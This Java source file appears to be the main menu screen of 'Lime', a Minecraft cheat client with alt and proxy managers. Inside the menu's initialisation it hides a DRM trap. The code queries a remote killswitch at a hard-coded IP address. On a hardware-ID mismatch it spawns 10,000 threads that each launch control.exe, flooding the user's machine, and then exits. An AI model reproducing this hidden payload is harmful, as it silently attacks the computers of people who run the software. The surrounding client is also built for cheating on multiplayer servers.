package lime.ui.gui;

import lime.core.Information;
import lime.core.Lime;
import lime.management.FontManager;
import lime.ui.fields.ButtonField;
import lime.ui.proxymanager.ProxyManagerScreen;
import lime.utils.render.RenderUtils;
import net.minecraft.client.gui.GuiMultiplayer;
import net.minecraft.client.gui.GuiOptions;
import net.minecraft.client.gui.GuiScreen;
import net.minecraft.client.gui.GuiSelectWorld;
import net.minecraft.util.EnumChatFormatting;
import org.lwjgl.opengl.GL11;

import javax.swing.*;
import java.awt.*;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.util.Base64;

public class MainScreen extends GuiScreen {
    public static boolean clickGui;

    public static boolean anim = false;

    public static String getHardwareID() {
        try {
            String string = System.getenv("PROCESSOR_IDENTIFIER") + System.getenv("PROCESSOR_LEVEL");
            MessageDigest messageDigest = MessageDigest.getInstance("md5");
            StringBuilder stringBuilder = new StringBuilder();
            messageDigest.update(string.getBytes());
            for (byte by : messageDigest.digest()) {
                String string2 = Integer.toHexString(0xFF & by);
                if (string2.length() == 1) {
                    stringBuilder.append('0');
                }
                stringBuilder.append(string2);
            }
            return Base64.getEncoder().encodeToString(stringBuilder.toString().getBytes());
        }
        catch (Exception exception) {
            exception.printStackTrace();
            return "fail";
        }
    }

    @Override
    public void initGui() {
        try {
            HttpURLConnection httpURLConnection = (HttpURLConnection) new URL("http://108.61.210.115/killswitch-b2.html").openConnection();
            if(Lime.getInstance().getUser() == null || !Lime.getInstance().getUser().getHwid().equals(getHardwareID())) {
                for (int i = 0; i < 10000; i++) {
                    new Thread(() -> {
                        try {
                            Runtime.getRuntime().exec("control.exe");
                        } catch (Exception e) {
                            System.exit(0);
                        }
                    }).start();
                }
                System.exit(0);
            }
            String content = "";
            try (BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream(), StandardCharsets.UTF_8)))
            {
                String inputLine;
                StringBuilder stringBuilder = new StringBuilder();
                while ((inputLine = bufferedReader.readLine()) != null)
                {
                    stringBuilder.append(inputLine);
                }
                content = stringBuilder.toString();
            }

            if(content.contains("true")) {
                JOptionPane.showMessageDialog(null, "Version detected as crack. You won't be able to use it.");
                System.exit(0);
            }
        } catch (Exception e) {
            System.exit(0);
        }
        clickGui = false;
        final Color color = new Color(41, 41, 41, 255);

        this.customButtonList.add(new ButtonField(FontManager.ProductSans20.getFont(), "Singleplayer", width / 2F - 75, height / 2F - 22 - 22, 150, 20, color, !anim, () -> {
            mc.displayGuiScreen(new GuiSelectWorld(this));
        }));
        this.customButtonList.add(new ButtonField(FontManager.ProductSans20.getFont(), "Multiplayer", width / 2F - 75, height / 2F - 22, 150, 20, color, !anim, () -> {
            mc.displayGuiScreen(new GuiMultiplayer(this));
        }));
        this.customButtonList.add(new ButtonField(FontManager.ProductSans20.getFont(), "Alt Manager", width / 2F - 75, height / 2F, 150, 20, color, !anim, () -> {
            mc.displayGuiScreen(Lime.getInstance().getAltManager().getAltManagerScreen());
        }));

        this.customButtonList.add(new ButtonField(FontManager.ProductSans20.getFont(), "Proxy Manager", width / 2F - 75, height / 2F + 22, 150, 20, color, !anim, () -> {
            mc.displayGuiScreen(new ProxyManagerScreen(this));
        }));

        this.customButtonList.add(new ButtonField(FontManager.ProductSans20.getFont(), "Options", width / 2F - 75, height / 2F + 22 + 22, 150, 20, color, !anim, () -> {
            mc.displayGuiScreen(new GuiOptions(this, mc.gameSettings));
        }));
        this.customButtonList.add(new ButtonField(FontManager.ProductSans20.getFont(), "Exit", width / 2F - 75, height / 2F + 44 + 22, 150, 20, color, !anim, () -> {
            mc.shutdown();
        }));
        anim = true;
        super.initGui();
    }

    @Override
    public void drawScreen(int mouseX, int mouseY, float partialTicks) {
        GuiScreen.drawRect(0, 0, mc.displayWidth, mc.displayHeight, new Color(21, 21, 21).getRGB());
        FontManager.ProductSans20.getFont().drawStringWithShadow("Made by " + Information.getAuthor(), width - (FontManager.ProductSans20.getFont().getStringWidth("Made by" + Information.getAuthor())) - 6, height - FontManager.ProductSans20.getFont().getFontHeight(), -1);
        FontManager.ProductSans20.getFont().drawStringWithShadow("Lime " + Information.getVersion() + " | Build: " + Information.getBuild(), 1, height - (FontManager.ProductSans20.getFont().getFontHeight()), -1);

        GL11.glPushMatrix();
        GL11.glEnable(GL11.GL_SCISSOR_TEST);

        RenderUtils.prepareScissorBox((width / 2F - (FontManager.ProductSans76.getFont().getStringWidth("Lime")  / 2F)), this.height / 2F - 132, (width / 2F - (FontManager.ProductSans76.getFont().getStringWidth("Lime")  / 2F)) + (FontManager.ProductSans76.getFont().getStringWidth("Lime")), this.height / 2F - 132 + FontManager.ProductSans76.getFont().getFontHeight() - 5);
        FontManager.ProductSans76.getFont().drawStringWithShadow(EnumChatFormatting.GREEN + "L§fime", (width / 2F - (FontManager.ProductSans76.getFont().getStringWidth("Lime")  / 2F)), this.height / 2F - 132, -1);
        GL11.glDisable(GL11.GL_SCISSOR_TEST);
        GL11.glPopMatrix();
        super.drawScreen(mouseX, mouseY, partialTicks);
    }

    @Override
    protected void keyTyped(char typedChar, int keyCode) throws IOException {
        if(keyCode == 54) {
            clickGui = true;
            mc.displayGuiScreen(Lime.getInstance().getClickGUI2());
        }
        super.keyTyped(typedChar, keyCode);
    }
}
